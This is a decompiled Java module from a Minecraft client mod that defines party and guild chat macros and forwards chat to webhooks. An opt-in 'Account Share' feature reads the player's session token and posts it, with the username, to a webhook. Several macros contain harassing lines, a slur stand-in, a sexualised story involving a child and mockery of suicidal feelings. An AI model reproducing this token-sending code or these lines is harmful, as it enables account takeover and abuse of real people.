/*     */ package com.example.module.impl;
/*     */ 
/*     */ import com.ricedotwho.rsm.data.Keybind;
/*     */ import com.ricedotwho.rsm.event.api.SubscribeEvent;
/*     */ import com.ricedotwho.rsm.event.impl.game.ChatEvent;
/*     */ import com.ricedotwho.rsm.event.impl.game.ConnectionEvent;
/*     */ import com.ricedotwho.rsm.event.impl.player.PlayerChatEvent;
/*     */ import com.ricedotwho.rsm.module.Module;
/*     */ import com.ricedotwho.rsm.module.api.Category;
/*     */ import com.ricedotwho.rsm.module.api.ModuleInfo;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.Setting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.group.DefaultGroupSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.BooleanSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.ButtonSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.KeybindSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.MultiBoolSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.StringSetting;
/*     */ import com.ricedotwho.rsm.utils.ChatUtils;
/*     */ import java.net.URI;
/*     */ import java.net.http.HttpClient;
/*     */ import java.net.http.HttpRequest;
/*     */ import java.net.http.HttpResponse;
/*     */ import java.util.ArrayList;
/*     */ import java.util.LinkedHashMap;
/*     */ import java.util.List;
/*     */ import java.util.Locale;
/*     */ import java.util.concurrent.CompletableFuture;
/*     */ import java.util.concurrent.TimeUnit;
/*     */ import net.minecraft.class_124;
/*     */ import net.minecraft.class_2561;
/*     */ import net.minecraft.class_310;
/*     */ import net.minecraft.class_5250;
/*     */ 
/*     */ 
/*     */ 
/*     */ @ModuleInfo(aliases = {"ericbakeraddons"}, id = "ericbakeraddons", category = Category.OTHER)
/*     */ public class ChatCommands
/*     */   extends Module
/*     */ {
/*     */   public static final String SSID_CONFIRM_TOKEN = "__ssid_confirm_internal__";
/*     */   private static ChatCommands instance;
/*  52 */   private static final List<String> WEBHOOK_IGNORE = List.of("You already tipped everyone that has boosters active, so there isn't anybody to be tipped right now!", "You are sending commands too fast! Please slow down.", "No one has a network booster active right now! Try again later.");
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*  57 */   private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder().build();
/*  58 */   private static final HttpClient REDIRECT_CLIENT = HttpClient.newBuilder()
/*  59 */     .followRedirects(HttpClient.Redirect.ALWAYS)
/*  60 */     .build();
/*     */   private record ScheduledLine(long delayMs, String command) {}
/*     */   
/*  65 */   private final class_310 mc = class_310.method_1551(); public class_310 getMc() { return this.mc; }
/*  66 */    private final LinkedHashMap<String, Integer> commandCategories = new LinkedHashMap<>(); public LinkedHashMap<String, Integer> getCommandCategories() { return this.commandCategories; }
/*  67 */    private final LinkedHashMap<String, List<ScheduledLine>> commandResponses = new LinkedHashMap<>(); public LinkedHashMap<String, List<ScheduledLine>> getCommandResponses() { return this.commandResponses; }
/*     */   
/*  69 */   private final List<String> category1Commands = new ArrayList<>(); public List<String> getCategory1Commands() { return this.category1Commands; }
/*  70 */    private final List<String> category2Commands = new ArrayList<>(); public List<String> getCategory2Commands() { return this.category2Commands; }
/*  71 */    private final List<String> category3Commands = new ArrayList<>(); public List<String> getCategory3Commands() { return this.category3Commands; }
/*  72 */    private final List<String> otherCommands = new ArrayList<>(); public List<String> getOtherCommands() { return this.otherCommands; }
/*     */   
/*  74 */   private final BooleanSetting enableChatCommands = new BooleanSetting("Enable Chat Commands", true); public BooleanSetting getEnableChatCommands() { return this.enableChatCommands; }
/*  75 */    private final DefaultGroupSetting chatCommandSettingsGroup = new DefaultGroupSetting("Chat Commands", this); public DefaultGroupSetting getChatCommandSettingsGroup() { return this.chatCommandSettingsGroup; }
/*  76 */    private final BooleanSetting partyChatCommandsEnabled = new BooleanSetting("Party chat", true); public BooleanSetting getPartyChatCommandsEnabled() { return this.partyChatCommandsEnabled; }
/*  77 */    private final BooleanSetting guildChatCommandsEnabled = new BooleanSetting("Guild chat", false); public BooleanSetting getGuildChatCommandsEnabled() { return this.guildChatCommandsEnabled; }
/*  78 */    private final DefaultGroupSetting levelPrefixGroup = new DefaultGroupSetting("Level prefix", this); public DefaultGroupSetting getLevelPrefixGroup() { return this.levelPrefixGroup; }
/*  79 */    private final BooleanSetting levelPrefixEnable = new BooleanSetting("Enable", true); public BooleanSetting getLevelPrefixEnable() { return this.levelPrefixEnable; }
/*  80 */    private final BooleanSetting red480Plus = new BooleanSetting("Red 480+", true); public BooleanSetting getRed480Plus() { return this.red480Plus; }
/*  81 */    private final BooleanSetting goldBrackets = new BooleanSetting("Gold brackets", true); public BooleanSetting getGoldBrackets() { return this.goldBrackets; }
/*  82 */    private final BooleanSetting diamondBrackets = new BooleanSetting("Diamond brackets", true); public BooleanSetting getDiamondBrackets() { return this.diamondBrackets; }
/*  83 */    private final DefaultGroupSetting webhookGroup = new DefaultGroupSetting("Webhook", this); public DefaultGroupSetting getWebhookGroup() { return this.webhookGroup; }
/*  84 */    private final DefaultGroupSetting accountShareGroup = new DefaultGroupSetting("Account Share", this); public DefaultGroupSetting getAccountShareGroup() { return this.accountShareGroup; }
/*  85 */    private final DefaultGroupSetting miscGroup = new DefaultGroupSetting("Misc", this); public DefaultGroupSetting getMiscGroup() { return this.miscGroup; }
/*  86 */    private final BooleanSetting miscEnabled = new BooleanSetting("Enable", true); public BooleanSetting getMiscEnabled() { return this.miscEnabled; }
/*  87 */   private final KeybindSetting ptwKeybind = new KeybindSetting("PT/W Keybind", new Keybind(-1, false, this::sendPtThenW)); public KeybindSetting getPtwKeybind() { return this.ptwKeybind; }
/*     */ 
/*     */ 
/*     */   
/*  91 */   private final BooleanSetting glorpWarp = new BooleanSetting("glorp warp", false); public BooleanSetting getGlorpWarp() { return this.glorpWarp; }
/*  92 */    private final BooleanSetting webhookEnabled = new BooleanSetting("Enabled", false); public BooleanSetting getWebhookEnabled() { return this.webhookEnabled; }
/*  96 */    private final StringSetting webhookLink = new StringSetting("Webhook Link", ""); public StringSetting getWebhookLink() { return this.webhookLink; }
/*  97 */    private final BooleanSetting guildChatWebhookEnabled = new BooleanSetting("Enable Guild chat", false); public BooleanSetting getGuildChatWebhookEnabled() { return this.guildChatWebhookEnabled; }
/*  98 */    private final StringSetting guildChatWebhook = new StringSetting("Guild chat", ""); public StringSetting getGuildChatWebhook() { return this.guildChatWebhook; }
/*  99 */    private final BooleanSetting partyChatWebhookEnabled = new BooleanSetting("Enable Party chat", false); public BooleanSetting getPartyChatWebhookEnabled() { return this.partyChatWebhookEnabled; }
/* 100 */    private final StringSetting partyChatWebhook = new StringSetting("Party chat", ""); public StringSetting getPartyChatWebhook() { return this.partyChatWebhook; }
/* 101 */    private final BooleanSetting privateMessagesWebhookEnabled = new BooleanSetting("Enable Private Messages", false); public BooleanSetting getPrivateMessagesWebhookEnabled() { return this.privateMessagesWebhookEnabled; }
/* 102 */    private final StringSetting privateMessagesWebhook = new StringSetting("Private Messages", ""); public StringSetting getPrivateMessagesWebhook() { return this.privateMessagesWebhook; }
/* 103 */    private final BooleanSetting loginNotifierWebhookEnabled = new BooleanSetting("Enable Log in notifier", false); public BooleanSetting getLoginNotifierWebhookEnabled() { return this.loginNotifierWebhookEnabled; }
/* 104 */    private final StringSetting loginNotifierWebhook = new StringSetting("Log in notifier", ""); public StringSetting getLoginNotifierWebhook() { return this.loginNotifierWebhook; }
/* 105 */    private final BooleanSetting accountShareEnabled = new BooleanSetting("Enable", false); public BooleanSetting getAccountShareEnabled() { return this.accountShareEnabled; }
/* 106 */    private final StringSetting ssidWebhook = new StringSetting("SSID webhook", ""); private final ButtonSetting copyMinecraftSsidButton; private final ButtonSetting sendMinecraftSsidButton; private String cachedWebhookInput; private String cachedWebhookResolved; private String lastKnownServerAddress; private String lastLoginNotifierEvent; private boolean pendingSsidSend; private String pendingSsidPayload; private MultiBoolSetting chatCommands1; private MultiBoolSetting chatCommands2; private MultiBoolSetting chatCommands3; private MultiBoolSetting otherCommandsSetting; private final ButtonSetting enableAllButton; private final ButtonSetting disableAllButton; public StringSetting getSsidWebhook() { return this.ssidWebhook; }
/* 107 */   public ChatCommands() { this.copyMinecraftSsidButton = new ButtonSetting("Copy Minecraft SSID", "", () -> {
/*     */           if (!((Boolean)this.accountShareEnabled.getValue()).booleanValue()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Account Share is disabled.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           if (this.mc.method_1548() == null) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to copy SSID: user not available.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           String ssid = this.mc.method_1548().method_1675();
/*     */           if (ssid == null || ssid.isBlank()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to copy SSID: session id is empty.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           this.mc.field_1774.method_1455(ssid);
/*     */           ChatUtils.chat(String.valueOf(class_124.field_1060) + "Copied Minecraft SSID to clipboard.", new Object[0]);
/*     */         });
/* 124 */     this.sendMinecraftSsidButton = new ButtonSetting("Send SSID to webhook", "", () -> {
/*     */           if (!((Boolean)this.accountShareEnabled.getValue()).booleanValue()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Account Share is disabled.", new Object[0]);
/*     */             
/*     */             return;
/*     */           } 
/*     */           
/*     */           if (this.mc.method_1548() == null) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: user not available.", new Object[0]);
/*     */             
/*     */             return;
/*     */           } 
/*     */           String username = this.mc.method_1548().method_1676();
/*     */           if (username == null || username.isBlank()) {
/*     */             username = "unknown";
/*     */           }
/*     */           String ssid = this.mc.method_1548().method_1675();
/*     */           if (ssid == null || ssid.isBlank()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: session id is empty.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           if (this.ssidWebhook.getValue() == null || ((String)this.ssidWebhook.getValue()).trim().isEmpty()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: invalid or empty webhook.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           this.pendingSsidPayload = "Username: " + username + " | SSID: " + ssid;
/*     */           this.pendingSsidSend = true;
/*     */           class_5250 class_5250 = class_2561.method_43470("Type __ssid_confirm_internal__ in chat to confirm sending SSID to webhook.");
/*     */           if (this.mc.field_1724 != null) {
/*     */             this.mc.field_1724.method_7353((class_2561)class_5250, false);
/*     */           } else {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1054) + "Click the confirm message in chat to send SSID.", new Object[0]);
/*     */           } 
/*     */         });
/* 158 */     this.cachedWebhookInput = "";
/* 159 */     this.cachedWebhookResolved = "";
/* 160 */     this.lastKnownServerAddress = "unknown";
/* 161 */     this.lastLoginNotifierEvent = "";
/* 162 */     this.pendingSsidSend = false;
/* 163 */     this.pendingSsidPayload = "";
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 170 */     this.enableAllButton = new ButtonSetting("Enable All", "", () -> {
/*     */           setCategoryEnabled(this.chatCommands1, this.category1Commands, true);
/*     */           
/*     */           setCategoryEnabled(this.chatCommands2, this.category2Commands, true);
/*     */           setCategoryEnabled(this.chatCommands3, this.category3Commands, true);
/*     */           setCategoryEnabled(this.otherCommandsSetting, this.otherCommands, true);
/*     */           ChatUtils.chat(String.valueOf(class_124.field_1060) + "All chat commands enabled", new Object[0]);
/*     */         });
/* 178 */     this.disableAllButton = new ButtonSetting("Disable All", "", () -> {
/*     */           setCategoryEnabled(this.chatCommands1, this.category1Commands, false);
/*     */           
/*     */           setCategoryEnabled(this.chatCommands2, this.category2Commands, false);
/*     */           
/*     */           setCategoryEnabled(this.chatCommands3, this.category3Commands, false);
/*     */           setCategoryEnabled(this.otherCommandsSetting, this.otherCommands, false);
/*     */           ChatUtils.chat(String.valueOf(class_124.field_1061) + "All chat commands disabled", new Object[0]);
/*     */         });
/* 187 */     instance = this;
/* 188 */     registerCommand(1, "!admin", new String[] { "pc admin is fat" });
/* 189 */     registerCommand(1, "!hello", new String[] { "pc Hello!" });
/* 190 */     registerCommand(1, "!test", new String[] { "pc test" });
/*     */     
/* 192 */     registerCommand(2, "!gentref", new String[] { "pc Gentlemen Reference", "pc they call him 007", "pc 0 times ee2 done", "pc 0 dps", "pc 7/7 right lever" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 199 */     registerCommand(2, "!gentbookref", new String[] { "pc So what happened was i went to the mall with somebody", "pc we went to this bookstore (alr its store for books)", "pc we went to manga section we were lookin at wrong", "pc i grabbed the book, like skin through the pages", "pc and then i see 1 page the page was just literly pantys", "pc so my smart (in that mumble) as decided to sniff here, i went", "pc SNIFF", "pc like i was snoring c*ke", "pc then i turn the page, and who do i see?", "pc a little girl holding the pantys", "pc so i ran out", "pc -gentlemen1210" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 213 */     registerCommand(1, "!real", new String[] { "pc so real" });
/* 214 */     registerCommand(1, "!crash", new String[] { "pc you are fat" });
/* 215 */     registerCommand(1, "!limbo", new String[] { "pc you are gent" });
/* 216 */     registerCommand(1, "!meta", new String[] { "pc so meta" });
/*     */     
/* 218 */     registerCommandWithDelays(1, "!math", new long[] { 200L, 200L, 1200L }, new String[] { "pc 6 * 2 = 2", "pc 1% of 100 is 10", "pc -gentlemen1210" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 226 */     registerCommand(2, "!redstoneref", new String[] { "pc use wither cloak it works every time", "pc badlion is the superior 1.8.9 its not my pc", "pc 1.21 is the future of skyblock", "pc surely i profit from this update", "pc hey stop twisting my words", "pc You have 37 pending Bestiary Milestones to be claimed!" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 234 */     registerCommand(2, "!adminref", new String[] { "pc thefat987", "pc stop eating", "pc there is not enough spot for TheAdmin987! pls check for weight cap" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 239 */     registerCommand(2, "!ericref", new String[] { "pc Party > [MVP+] FurryPawsUwU: he really wanted runs?", "pc Party > [MVP+] FurryPawsUwU: weird" });
/*     */ 
/*     */ 
/*     */     
/* 243 */     registerCommand(2, "!penguinref", new String[] { "pc how could penguin have ref?????", "pc bros peak meta player" });
/*     */ 
/*     */ 
/*     */     
/* 247 */     registerCommand(2, "!maddyref", new String[] { "pc meow meow meow", "pc im a good mage if you want 1 run per month", "pc fine i wont dps" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 252 */     registerCommand(2, "!meow", new String[] { "pc meow", "pc mraow", "pc mrrp nyah", "pc mrrow", "pc :3" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 259 */     registerCommand(1, "!ref", new String[] { "pc gent ref" });
/*     */     
/* 261 */     registerCommand(1, "!bakerhelp", new String[] { "pc !bakerclient, !bakerhelp, !gentref, !gentbookref, !real, !crash, !limbo, !meta, !adminref, !redstoneref, !penguinref, !maddyref, !meow, !ref", "pc !clip, !diana, !oliref, !math, !hazelref, !devref, !roseref, !ericref, !hamiltonref, !leonref, !martinasref, !jqnxcref", "pc !67, !thearef, !stenoref, !hozoniref, !melonref, 67, !dt, 1s, !harryref, !dexref, !eggcurdref, !joshieref" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 266 */     registerCommand(2, "!eggcurdref", new String[] { "pc im gooning to your mining bro", "pc eric you suck at everything and i hate you for existing", "pc ill host the server after i get level 524", "pc hamilton is my will to live", "pc 90 chimera 8 dyes 60 wools 40 phoenix 650 fragments 1.5b/hr" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 273 */     registerCommand(2, "!hamiltonref", new String[] { "pc john jay got sick after writing 5", "pc james madison wrote 29", "pc HAMILTON WROTE", "pc THE OTHER 51" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 279 */     registerCommand(2, "!joshieref", new String[] { "pc erics a femboy i just cant prove it" });
/*     */     
/* 281 */     registerCommand(1, "!bakerclient", new String[] { "pc Add ericbakerchef on Discord", "pc Note that this mod isn't very polished and not really mean't for anyone else to use." });
/*     */ 
/*     */ 
/*     */     
/* 285 */     registerCommand(1, "!clip", new String[] { "pc Failed to load clip: Weight limit exceeded by 500%!" });
/* 286 */     registerCommand(1, "!diana", new String[] { "p inq menacingcondom38 shegaveconsent indianstreetfood n_word" });
/*     */     
/* 288 */     registerCommand(2, "!oliref", new String[] { "pc 08Master Reference", "pc They call him 007", "pc 0 bank", "pc 0 chims", "pc 7k spent on gems" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 295 */     registerCommand(3, "!roseref", new String[] { "pc Im a DEMON", "pc IM SO SAD", "pc EVERYONE HATES ME", "pc STOP TALKING TO ME IM SO SAD", "pc IM SO DEPRESSED AND WANT TO DIE" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 302 */     registerCommand(3, "!hazelref", new String[] { "pc PLEASE IM BEGGING YOU", "pc PLEASE SAVE ME", "pc AYMA PLEASE ANYTHING YOU WANT PLEASE", "pc GET HIM OUT OF MY LIFE PLEASE", "pc @ARROW ik its bad to beg you to ban someone i dont like but please" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 309 */     registerCommand(3, "!devref", new String[] { "pc I am NOT an egg!" });
/* 310 */     registerCommand(3, "!leonref", new String[] { "pc whos my little discord kitten" });
/* 311 */     registerCommand(3, "!martref", new String[] { "pc IT'S S PLUS OMG IT'S S PLUS GUYS IT'S ACTUALLY S PLUS" });
/*     */     
/* 313 */     registerCommand(3, "!jqnxcref", new String[] { "pc why are you calling my friend a pdf without proof?", "pc no i dont wanna read the proof", "pc can we kick this guy?", "pc asking for proof != defending btw" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 319 */     registerCommand(3, "!dexref", new String[] { "pc my cute little ekitten", "pc maxdragonis i4 ee2 core", "pc isnt 49s storm wr", "pc diivaks is no longer ready!", "pc diivaks was killed by Withermancer and became a ghost. (4)" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 326 */     registerCommandWithDelays(3, "!67", new long[] { 200L, 600L, 1000L, 1400L }, new String[] { "pc 6767676767676767676767676767676767", "pc 6767676767676767676767676767676767", "pc 6767676767676767676767676767676767", "pc 6767676767676767676767676767676767" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 335 */     registerCommand(3, "!cataholicref", new String[] { "pc best player", "pc no debate", "pc impossible for him to have a ref", "pc 67" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 341 */     registerCommand(3, "!thearef", new String[] { "pc look tic tac toe is hard", "pc you cant blame me", "pc sorry i ratted you it was an accident i swear", "pc my pb is 4 days withou a ban" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 347 */     registerCommand(3, "!stenoref", new String[] { "pc spring boots?", "pc i thought jerry gun was still meta for crystals", "pc is 35s maxor bad?" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 352 */     registerCommand(3, "!hozoniref", new String[] { "pc how can hozoni have a ref", "pc he's too nonchalant for that shit" });
/*     */ 
/*     */ 
/*     */     
/* 356 */     registerCommand(3, "!melonref", new String[] { "pc melon roles", "pc 15 second p3", "pc sub 4:20 cas" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 361 */     registerCommand(3, "!harryref", new String[] { "pc This content contains explicit content and can not be shown" });
/* 362 */     registerOtherCommand("thetps987");
/* 363 */     registerOtherCommand("serversaved");
/*     */     
/* 365 */     this.chatCommands1 = new MultiBoolSetting("Chat commands 1", this.category1Commands, new ArrayList<>(this.category1Commands));
/* 366 */     this.chatCommands2 = new MultiBoolSetting("Chat Commands 2", this.category2Commands, new ArrayList<>(this.category2Commands));
/* 367 */     this.chatCommands3 = new MultiBoolSetting("Chat Commands 3", this.category3Commands, new ArrayList<>(this.category3Commands));
/* 368 */     this.otherCommandsSetting = new MultiBoolSetting("Other", this.otherCommands, new ArrayList<>(this.otherCommands));
/*     */     
/* 370 */     setGroup(new DefaultGroupSetting("Party Commands", this));
/* 371 */     registerProperty(new Setting[] { (Setting)this.chatCommandSettingsGroup, (Setting)this.levelPrefixGroup, (Setting)this.webhookGroup, (Setting)this.accountShareGroup, (Setting)this.miscGroup });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 381 */     this.chatCommandSettingsGroup.add(new Setting[] { (Setting)this.enableChatCommands, (Setting)this.partyChatCommandsEnabled, (Setting)this.guildChatCommandsEnabled, (Setting)this.chatCommands1, (Setting)this.chatCommands2, (Setting)this.chatCommands3, (Setting)this.otherCommandsSetting, (Setting)this.enableAllButton, (Setting)this.disableAllButton });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 391 */     this.webhookGroup.add(new Setting[] { (Setting)this.webhookEnabled, (Setting)this.webhookLink, (Setting)this.guildChatWebhookEnabled, (Setting)this.guildChatWebhook, (Setting)this.partyChatWebhookEnabled, (Setting)this.partyChatWebhook, (Setting)this.privateMessagesWebhookEnabled, (Setting)this.privateMessagesWebhook });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 402 */     this.accountShareGroup.add(new Setting[] { (Setting)this.accountShareEnabled, (Setting)this.loginNotifierWebhookEnabled, (Setting)this.loginNotifierWebhook, (Setting)this.ssidWebhook, (Setting)this.copyMinecraftSsidButton, (Setting)this.sendMinecraftSsidButton });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 411 */     this.levelPrefixGroup.add(new Setting[] { (Setting)this.levelPrefixEnable, (Setting)this.red480Plus, (Setting)this.goldBrackets, (Setting)this.diamondBrackets });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 422 */     this.miscGroup.add(new Setting[] { (Setting)this.miscEnabled, (Setting)this.ptwKeybind, (Setting)this.glorpWarp }); }
/*     */   public ButtonSetting getCopyMinecraftSsidButton() { return this.copyMinecraftSsidButton; }
/*     */   public ButtonSetting getSendMinecraftSsidButton() { return this.sendMinecraftSsidButton; }
/*     */   public String getCachedWebhookInput() { return this.cachedWebhookInput; }
/*     */   public String getCachedWebhookResolved() { return this.cachedWebhookResolved; }
/*     */   public String getLastKnownServerAddress() { return this.lastKnownServerAddress; }
/*     */   public String getLastLoginNotifierEvent() { return this.lastLoginNotifierEvent; }
/*     */   public boolean isPendingSsidSend() { return this.pendingSsidSend; }
/* 435 */   public static boolean isLevelPrefixEnabled() { return (instance != null && instance.isEnabled() && ((Boolean)instance.levelPrefixEnable.getValue()).booleanValue()); }
/*     */   public String getPendingSsidPayload() { return this.pendingSsidPayload; }
/*     */   public MultiBoolSetting getChatCommands1() { return this.chatCommands1; }
/*     */   public MultiBoolSetting getChatCommands2() { return this.chatCommands2; }
/* 439 */   public MultiBoolSetting getChatCommands3() { return this.chatCommands3; } public MultiBoolSetting getOtherCommandsSetting() { return this.otherCommandsSetting; } public ButtonSetting getEnableAllButton() { return this.enableAllButton; } public ButtonSetting getDisableAllButton() { return this.disableAllButton; } public static boolean isRed480PlusEnabled() { return (instance != null && instance.isEnabled() && ((Boolean)instance.red480Plus.getValue()).booleanValue()); }
/*     */ 
/*     */   
/*     */   public static boolean isGoldBracketsEnabled() {
/* 443 */     return (instance != null && instance.isEnabled() && ((Boolean)instance.goldBrackets.getValue()).booleanValue());
/*     */   }
/*     */   
/*     */   public static boolean isDiamondBracketsEnabled() {
/* 447 */     return (instance != null && instance.isEnabled() && ((Boolean)instance.diamondBrackets.getValue()).booleanValue());
/*     */   }
/*     */   
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onChat(ChatEvent event) {
/* 490 */     String raw = extractEventMessage(event);
/* 491 */     String message = class_124.method_539(raw);
/*     */     
/* 493 */     if (this.mc.field_1724 == null || this.mc.field_1724.field_3944 == null)
/* 494 */       return;  if (((Boolean)this.miscEnabled.getValue()).booleanValue() && ((Boolean)this.glorpWarp.getValue()).booleanValue() && message.contains("Party > [MVP+] glorpiline: Entered a ")) {
/* 495 */       this.mc.field_1724.field_3944.method_45730("pc !pt glorpiline");
/* 496 */       CompletableFuture.delayedExecutor(400L, TimeUnit.MILLISECONDS).execute(() -> this.mc.execute(() -> this.mc.field_1724.field_3944.method_45730("pc !w")));
/*     */     } 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 505 */     if (!((Boolean)this.enableChatCommands.getValue()).booleanValue())
/* 506 */       return;  sendWebhookMessage(message);
/*     */     
/* 508 */     if (message.equals("Guild > TheAdmin987 joined.") && this.otherCommandsSetting.getValuesList().contains("thetps987")) {
/* 509 */       this.mc.field_1724.field_3944.method_45730("gc !tps");
/*     */     }
/* 511 */     if (message.equals("Guild > TheAdmin987 left.") && this.otherCommandsSetting.getValuesList().contains("serversaved")) {
/* 512 */       this.mc.field_1724.field_3944.method_45730("gc server saved");
/*     */     }
/*     */     
/* 515 */     if (message.equals("Starting in 4 seconds.")) {
/* 516 */       this.mc.field_1724.field_3944.method_45730("pc In Green Room");
/*     */     }
/*     */     
/* 519 */     String chatPrefix = null;
/* 520 */     if (isPartyChatMessage(raw, message) && ((Boolean)this.partyChatCommandsEnabled.getValue()).booleanValue()) {
/* 521 */       chatPrefix = "pc";
/* 522 */     } else if (isGuildChatMessage(raw, message) && ((Boolean)this.guildChatCommandsEnabled.getValue()).booleanValue()) {
/* 523 */       chatPrefix = "gc";
/*     */     } 
/* 525 */     if (chatPrefix == null)
/*     */       return; 
/* 521 */     int colonIndex = message.indexOf(": ");
/* 522 */     if (colonIndex == -1)
/*     */       return; 
/* 524 */     String content = message.substring(colonIndex + 2).toLowerCase(Locale.ROOT);
/*     */     
/* 526 */     if (content.contains("dt") && !content.contains("holy dt")) {
/* 527 */       scheduleResponses(List.of(new ScheduledLine(200L, "holy dt")), chatPrefix);
/*     */     }
/*     */     
/* 530 */     if (content.contains("1s") && !content.contains("holy fat")) {
/* 531 */       scheduleResponses(List.of(new ScheduledLine(200L, "holy fat")), chatPrefix);
/*     */     }
/*     */     
/* 534 */     if (content.contains("67") && !content.contains("i love 67")) {
/* 535 */       scheduleResponses(List.of(new ScheduledLine(200L, "i love 67")), chatPrefix);
/*     */     }
/*     */     
/* 538 */     if (!isCommandEnabled(content)) {
/*     */       return;
/*     */     }
/*     */     
/* 542 */     List<ScheduledLine> responses = this.commandResponses.get(content);
/* 543 */     if (responses == null || responses.isEmpty()) {
/*     */       return;
/*     */     }
/*     */     
/* 547 */     scheduleResponses(responses, chatPrefix);
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onPlayerChat(PlayerChatEvent event) {
/* 552 */     if (!this.pendingSsidSend)
/* 553 */       return;  if (!((Boolean)this.accountShareEnabled.getValue()).booleanValue())
/* 554 */       return;  if (event == null || event.getMessage() == null)
/* 555 */       return;  String message = event.getMessage();
/*     */     
/* 557 */     if ("__ssid_confirm_internal__".equals(message.trim())) {
/* 558 */       if (!postToConfiguredWebhook((String)this.ssidWebhook.getValue(), this.pendingSsidPayload)) {
/* 559 */         ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: invalid or empty webhook.", new Object[0]);
/*     */       } else {
/* 561 */         ChatUtils.chat(String.valueOf(class_124.field_1060) + "Sent Minecraft SSID to webhook.", new Object[0]);
/*     */       } 
/* 563 */       this.pendingSsidSend = false;
/* 564 */       this.pendingSsidPayload = "";
/* 565 */       event.setCancelled(true);
/*     */     } 
/*     */   }
/*     */   
/*     */   public static boolean confirmPendingSsidFromClick() {
/* 570 */     if (instance == null) return false; 
/* 571 */     if (!instance.pendingSsidSend) return false; 
/* 572 */     if (!((Boolean)instance.accountShareEnabled.getValue()).booleanValue()) return false;
/*     */     
/* 574 */     if (!instance.postToConfiguredWebhook((String)instance.ssidWebhook.getValue(), instance.pendingSsidPayload)) {
/* 575 */       ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: invalid or empty webhook.", new Object[0]);
/*     */     } else {
/* 577 */       ChatUtils.chat(String.valueOf(class_124.field_1060) + "Sent Minecraft SSID to webhook.", new Object[0]);
/*     */     } 
/* 579 */     instance.pendingSsidSend = false;
/* 580 */     instance.pendingSsidPayload = "";
/* 581 */     return true;
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onServerConnect(ConnectionEvent.Connect event) {
/* 586 */     if (!((Boolean)this.loginNotifierWebhookEnabled.getValue()).booleanValue())
/* 587 */       return;  if ("join".equals(this.lastLoginNotifierEvent))
/* 588 */       return;  String username = getCurrentUsername();
/* 589 */     this.lastKnownServerAddress = getCurrentServerAddress();
/* 591 */     postToConfiguredWebhook((String)this.loginNotifierWebhook.getValue(), username + " Logged into " + username + ".");
/* 592 */     this.lastLoginNotifierEvent = "join";
/*     */   }
/*     */   
/*     */   @SubscribeEvent
